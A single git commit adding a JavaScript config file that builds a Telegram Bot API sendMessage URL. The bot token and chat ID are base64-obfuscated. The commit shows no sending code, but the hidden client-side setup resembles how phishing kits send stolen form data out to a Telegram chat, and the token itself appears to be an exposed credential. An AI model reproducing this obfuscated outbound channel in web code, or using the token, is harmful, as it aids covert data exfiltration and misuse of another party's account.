ea72283745c2a41a0f6dec4a2d9dea841e8592d7
rahmanabdullah <rahmanabdullah11223@gmail.com>
2025-04-12 08:37:51 -0700

    first commit

---
+++ js/config.js
@@ -0,0 +1,4 @@
+const telegramConfig = {
+    apiUrl: 'https://api.telegram.org/bot' + atob('NzYyNDM1NzQ2OTpBQUVYYi1SODlTdHE2NnN2R1kxMlNyWTkxZWUydlJYaDhBYw==') + '/sendMessage',
+    chatId: atob('NzYwOTM4ODk5Mg==')
+};
